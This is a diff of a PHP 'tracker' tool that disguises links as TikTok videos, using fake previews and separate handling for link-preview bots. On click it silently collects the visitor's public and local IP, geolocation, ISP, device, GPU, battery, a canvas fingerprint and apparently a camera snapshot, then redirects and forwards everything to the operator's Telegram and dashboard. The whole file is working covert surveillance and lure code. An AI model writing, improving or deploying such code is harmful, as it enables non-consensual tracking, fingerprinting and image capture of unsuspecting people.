@@ -116,14 +116,14 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// Highly Advanced Meta Fetching Function (3 Layers of Extraction)
+// Highly robust data fetching function (immune to blocking)
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
     
-    // Layer 1: oEmbed API (Fastest, but highly rate-limited by TikTok)
+    // 1. Attempt via oEmbed (Best method)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
     curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 3,
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4,
         CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
     ]);
     $response = curl_exec($ch); curl_close($ch);
@@ -136,45 +136,35 @@ function fetch_tiktok_exclusive_meta($url) {
         }
     }
     
-    // Layer 2: Direct HTML Scraping (Meta tags)
+    // 2. Attempt via page scraping (Fallback)
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5,
         CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        CURLOPT_HTTPHEADER => ['Accept-Language: en-US,en;q=0.9']
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
     ]);
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
-        // Fetch Image
+        // Fetch Image (prefer og:image)
         if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
+        } elseif (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
+            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
         }
-        
+
         // Fetch Title
         if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $title = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
-            $meta['title'] = (stripos($title, 'TikTok') === false) ? 'TikTok - ' . $title : $title;
-        }
-
-        // Layer 3: Deep JSON Extraction (If Layers 1 & 2 failed to get proper data)
-        if (strpos($meta['image'], 'unsplash') !== false || strpos($meta['title'], 'TikTok Video') !== false) {
-            if (preg_match('/<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application\/json">(.*?)<\/script>/s', $html, $json_match)) {
-                $json = json_decode($json_match[1], true);
-                if ($json) {
-                    $item = $json['__DEFAULT_SCOPE__']['webapp.video-detail']['itemInfo']['itemStruct'] ?? null;
-                    if ($item) {
-                        if (!empty($item['desc'])) {
-                            $title = html_entity_decode($item['desc'], ENT_QUOTES, 'UTF-8');
-                            $meta['title'] = (stripos($title, 'TikTok') === false) ? 'TikTok - ' . $title : $title;
-                        }
-                        if (!empty($item['video']['cover'])) {
-                            $meta['image'] = $item['video']['cover'];
-                        }
-                    }
+            if (stripos($title, 'Make Your Day') !== false) {
+                if (preg_match('/"desc":"([^"]+)"/', $html, $desc_match)) {
+                    $title = html_entity_decode(stripslashes($desc_match[1]), ENT_QUOTES, 'UTF-8');
                 }
             }
+            $meta['title'] = (stripos($title, 'TikTok') === false) ? 'TikTok - ' . $title : $title;
+        } elseif (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
+            $title = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
+            $meta['title'] = 'TikTok - ' . $title;
         }
     }
     return $meta;
@@ -188,7 +178,7 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// Smart ISP Detection
+// Smart ISP detection
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -234,9 +224,9 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
-// ==============================================================================
+// ==========================================
 // Tracker (Zero-Click & Extreme Speed)
-// ==============================================================================
+// ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT l.*, u.tg_chat, u.tg_token FROM links l LEFT JOIN users u ON l.user_id = u.id WHERE l.code = ?");
@@ -255,6 +245,7 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
+            // Use original image from database, pass to proxy to ensure unblocked
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
             
             header('Content-Type: text/html; charset=utf-8');
@@ -265,6 +256,7 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
+            // Add video tags to show play button
             echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:type" content="video/mp4">';
@@ -275,7 +267,7 @@ if (isset($_GET['r'])) {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             if ($is_bot) exit('OK');
             
-            // Send response immediately to browser to redirect instantly
+            // Biggest speed secret: send response to browser immediately
             if (function_exists('fastcgi_finish_request')) {
                 echo 'OK'; 
                 fastcgi_finish_request();
@@ -283,7 +275,7 @@ if (isset($_GET['r'])) {
                 header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
             }
 
-            // Background data collection
+            // Continue gathering data in background
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
             
@@ -305,8 +297,8 @@ if (isset($_GET['r'])) {
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
                 
                 $msg = "<b>New Visit!</b>\n\n";
-                $msg .= "<b>Link Name:</b> {$link['name']}\n";
-                $msg .= "<b>Device:</b> {$device}\n";
+                $msg .= "<b>Account Name:</b> {$link['name']}\n";
+                $msg .= "<b>Model:</b> {$device}\n";
                 $msg .= "<b>Location:</b> {$ip_details['location']}\n";
                 $msg .= "<b>ISP:</b> {$ip_details['isp']}\n";
                 $msg .= "<b>Public IP:</b> <code>{$public_ip}</code>\n";
@@ -333,7 +325,7 @@ if (isset($_GET['r'])) {
         function getScreenInfo() { return `${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio}x`; }
         function getGPUInfo() { try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); const ext = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch (e) { return 'Unknown'; } }
         async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
-        function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
+        function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
         function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
 
         async function initTracking() {
@@ -367,7 +359,7 @@ if (isset($_GET['r'])) {
                 fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }); 
             }
             
-            // Instant Redirect
+            // Instant Redirect (max speed possible)
             window.location.replace(targetUrl); 
             
             await cameraPromise;
@@ -386,7 +378,9 @@ if (isset($_GET['r'])) {
     } else { die("Link not found."); }
 }
 
-// Background image receiver
+// ==========================================
+// Background image receiver (if camera was delayed)
+// ==========================================
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
     $code = $_POST['code'];
     $img_base64 = $_POST['image'] ?? '';
@@ -397,9 +391,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
 }
 
 
-// ==============================================================================
+// ==========================================
 // Dashboard
-// ==============================================================================
+// ==========================================
 $login_error = '';
 if (isset($_POST['login'])) {
     $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
@@ -503,7 +497,7 @@ if ($is_logged_in) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel</title>
+    <title>Control Panel - Aziz Edition</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
